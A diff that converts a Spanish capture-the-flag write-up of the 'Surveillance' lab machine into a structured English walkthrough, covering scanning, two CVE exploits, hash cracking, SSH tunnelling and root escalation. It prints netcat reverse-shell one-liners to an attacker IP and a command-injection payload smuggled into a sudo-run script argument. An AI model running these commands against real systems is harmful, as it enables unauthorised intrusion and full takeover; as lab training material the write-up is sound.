@@ -7,6 +7,128 @@
   <link rel="stylesheet" href="../../assets/css/writeups_style.css" type="text/css" />
 </head>
 <body>
-<div class='page'><h1 class='title'>Surveillance</h1><br/><p><ol><li>Realizo un escaneo de NMAP para ver que puertos  están abiertos</br><strong> nmap -Pn -sC -sV -p- --open &lt;IP&gt; -oN scan.txt</strong></li><li>Están abiertos los piertos 22 (OpenSSH 8.9p1) y 80 (nginx 1.18.0)</li><li>No encuentra la pagina web por lo que la añadimos a los dominions /etc/hosts </li></ol><img src="images/35-1.png" alt="images/35-1.png" /><ol><li>Realizo un escaneo de directorios para ver si encuentra algún login o algo  interesante </br><strong>gobuster dir -u <a href="http://surveillance.htb/">http://surveillance.htb/</a> -w /usr/share/wordlists/dirb/big.txt</strong></li><li>Encuentro el directorio /admin/login</li><li>Buscando en el código de  la página web encuentro un enlace a un repositorio de github </li></ol><img src="images/35-2.png" alt="images/35-2.png" /><ol><li>Por lo que parece ser tenemos la versión</li><li>Encuentro el CVE-2023-41892 que permite RCE</li><li>Ya tenemos un reverse shell </li></ol><img src="images/35-3.png" alt="images/35-3.png" /><ol><li>Mi siguiente objetivo será tener un reverse shell más estable</li><li>Creo un reverse con msfvenom  </br><strong>   msfvenom -p cmd/unix/reverse_netcat LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; R</strong></li><li>Y nos devuelve el código que tenemos que ejecutar  <strong>   mkfifo /tmp/ypev; nc &lt;IP&gt; &lt;PORT&gt; 0&lt;/tmp/ypev | /bin/sh &gt;/tmp/ypev 2&gt;&amp;1; rm /tmp/ypev</strong></li><li>Obtengo el shell en mi netcat</li><li>Upgradeo el shell para que sea más interactivo con Python</br><strong> python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</strong></li><li>Encuentro dos usuarios. <strong>Matthew</strong> u <strong>zoneminder</strong></li><li>Encuentro un archivo que puede contener información importante </li></ol><img src="images/35-4.png" alt="images/35-4.png" /><ol><li>Me mando el archivo a mi máquina </li></ol><img src="images/35-5.png" alt="images/35-5.png" /><ol><li><img src="images/35-6.png" alt="images/35-6.png" /><ol><li>Busco los usuarios que encontre en el archivo sql </li></ol><img src="images/35-7.png" alt="images/35-7.png" /><ol><li>Encuentro un hash</li><li>Uso hash id para ver que tipo de hash es y poder crackearlo</li><li>Después de crackear el hash obtengo la contraseña y entro con el usuario matthew</li><li>Lo hago a través de ssh para tener una conexión buena y estable </li></ol><img src="images/35-8.png" alt="images/35-8.png" /><ol><li>Encuentro la flag user.txt en el directorio home de matthew</li><li>Parece ser que hay una app llamada zoneminder </li></ol><img src="images/35-9.png" alt="images/35-9.png" /><ol><li>Parece ser que se está ejecutando en otro puerto </li></ol><img src="images/35-10.png" alt="images/35-10.png" /><ol><li>Debe estar en otra red por lo que usaré la máquina que ataqué para hacer un portforwarding a través de ssh.</br><strong> ssh -L 4444:127.0.0.1:8080 matthew@surveillance.htb</strong></li><li>Ahora si que podemos acceder a esta página </li></ol><img src="images/35-11.png" alt="images/35-11.png" /><ol><li>Ahora tengo que buscar la versión de zoneminder para ver si puedo usar un exploit para obtener un RCE </li></ol><img src="images/35-12.png" alt="images/35-12.png" /><ol><li>Encuentro el  CVE-2023-26035</li><li>Obtengo un reverse shell </li></ol><img src="images/35-13.png" alt="images/35-13.png" /><ol><li>Con <strong>sudo -l</strong> encuentro que se puede ejecutar este comando como root </li></ol><img src="images/35-14.png" alt="images/35-14.png" /><ol><li>Creo un reverse en /tmp </br><strong>echo &#39;#!/bin/bash busybox nc &lt;IP&gt; &lt;PORT&gt; -e sh&#39; &gt; myscript.sh</strong></li><li>lo paso a la maquina atacada y le asigno permisos</li><li>Ejecuto este comando para poder escalar privilegios <strong>  sudo /usr/bin/zmupdate.pl --version=1 --user=&#39;$(/tmp/reverse.sh)&#39; --pass=ZoneMinderPassword2023</strong></li><li>Obtengo la flag root</li></ol></p><p align="center"></p></div>
+  <div class="page">
+    <h1 class="title">Surveillance</h1>
+
+    <section>
+      <h2>Reconnaissance</h2>
+      <p>
+        I start with a full Nmap scan to identify open ports and running services on the target host.
+      </p>
+      <pre><code>nmap -Pn -sC -sV -p- --open &lt;IP&gt; -oN scan.txt</code></pre>
+      <p>
+        The scan reveals that ports 22 and 80 are open, running OpenSSH 8.9p1 and nginx 1.18.0 respectively.
+        Since the website does not resolve by default, I add the domain to the <strong>/etc/hosts</strong> file to properly access it.
+      </p>
+      <img src="images/35-1.png" alt="images/35-1.png" />
+    </section>
+
+    <section>
+      <h2>Enumeration / Analysis</h2>
+      <p>
+        With the website accessible, I perform directory enumeration in order to discover hidden endpoints,
+        authentication panels, or other potentially interesting resources.
+      </p>
+      <pre><code>gobuster dir -u http://surveillance.htb/ -w /usr/share/wordlists/dirb/big.txt</code></pre>
+      <p>
+        During enumeration, I identify the <strong>/admin/login</strong> directory. While inspecting the page source,
+        I also discover a reference to a public GitHub repository, which provides valuable information about the application in use.
+      </p>
+      <img src="images/35-2.png" alt="images/35-2.png" />
+      <p>
+        Based on the repository and version information, I identify a known vulnerability. Specifically, CVE-2023-41892,
+        which allows for remote code execution under certain conditions.
+      </p>
+    </section>
+
+    <section>
+      <h2>Exploitation</h2>
+      <p>
+        By exploiting CVE-2023-41892, I successfully achieve remote code execution on the target and obtain an initial reverse shell.
+      </p>
+      <img src="images/35-3.png" alt="images/35-3.png" />
+      <p>
+        To improve stability, I decide to generate a more reliable reverse shell payload using msfvenom.
+      </p>
+      <pre><code>msfvenom -p cmd/unix/reverse_netcat LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; R</code></pre>
+      <p>
+        The generated payload provides a command that I execute on the target to establish the connection.
+      </p>
+      <pre><code>mkfifo /tmp/ypev; nc &lt;IP&gt; &lt;PORT&gt; 0&lt;/tmp/ypev | /bin/sh &gt;/tmp/ypev 2&gt;&amp;1; rm /tmp/ypev</code></pre>
+      <p>
+        Once connected, I upgrade the shell using Python to obtain a fully interactive TTY.
+      </p>
+      <pre><code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
+      <p>
+        At this point, I identify two local users on the system: <strong>matthew</strong> and <strong>zoneminder</strong>.
+        While exploring the filesystem, I locate a file that appears to contain potentially sensitive information.
+      </p>
+      <img src="images/35-4.png" alt="images/35-4.png" />
+      <p>
+        I transfer this file to my local machine for further analysis.
+      </p>
+      <img src="images/35-5.png" alt="images/35-5.png" />
+      <img src="images/35-6.png" alt="images/35-6.png" />
+      <p>
+        While inspecting the SQL content, I search for the previously identified users and locate credential-related data.
+      </p>
+      <img src="images/35-7.png" alt="images/35-7.png" />
+      <p>
+        I extract a password hash and use hash identification techniques to determine its format.
+        After successfully cracking the hash, I recover the password for the <strong>matthew</strong> user.
+      </p>
+      <p>
+        Using these credentials, I establish an SSH connection as matthew to gain a stable and persistent shell.
+      </p>
+      <img src="images/35-8.png" alt="images/35-8.png" />
+      <p>
+        Inside matthew’s home directory, I retrieve the <strong>user.txt</strong> flag. During further exploration,
+        I notice references to an application named <strong>ZoneMinder</strong>.
+      </p>
+      <img src="images/35-9.png" alt="images/35-9.png" />
+      <p>
+        Additional checks reveal that ZoneMinder is running on a different port, not directly accessible from my machine.
+      </p>
+      <img src="images/35-10.png" alt="images/35-10.png" />
+      <p>
+        To access this service, I create an SSH port forwarding tunnel through the compromised host.
+      </p>
+      <pre><code>ssh -L 4444:127.0.0.1:8080 matthew@surveillance.htb</code></pre>
+      <p>
+        This allows me to access the ZoneMinder web interface locally.
+      </p>
+      <img src="images/35-11.png" alt="images/35-11.png" />
+      <p>
+        From the application interface, I determine the exact version of ZoneMinder in use and begin searching for known vulnerabilities.
+      </p>
+      <img src="images/35-12.png" alt="images/35-12.png" />
+      <p>
+        I identify CVE-2023-26035, which can be exploited to achieve remote code execution. Using this vulnerability,
+        I obtain another reverse shell, this time with higher privileges.
+      </p>
+      <img src="images/35-13.png" alt="images/35-13.png" />
+    </section>
+
+    <section>
+      <h2>Privilege Escalation</h2>
+      <p>
+        Running <strong>sudo -l</strong> reveals that I can execute a specific ZoneMinder-related command as root.
+      </p>
+      <img src="images/35-14.png" alt="images/35-14.png" />
+      <p>
+        To leverage this misconfiguration, I create a malicious script in the <strong>/tmp</strong> directory that initiates a reverse shell.
+      </p>
+      <pre><code>echo '#!/bin/bash busybox nc &lt;IP&gt; &lt;PORT&gt; -e sh' &gt; myscript.sh</code></pre>
+      <p>
+        After transferring the script to the target and assigning execution permissions, I execute the vulnerable command
+        in a way that triggers my payload with root privileges.
+      </p>
+      <pre><code>sudo /usr/bin/zmupdate.pl --version=1 --user='$(/tmp/reverse.sh)' --pass=ZoneMinderPassword2023</code></pre>
+      <p>
+        This results in a root shell, allowing me to finally retrieve the <strong>root.txt</strong> flag and complete the machine.
+      </p>
+    </section>
+  </div>
 </body>
+
 </html>
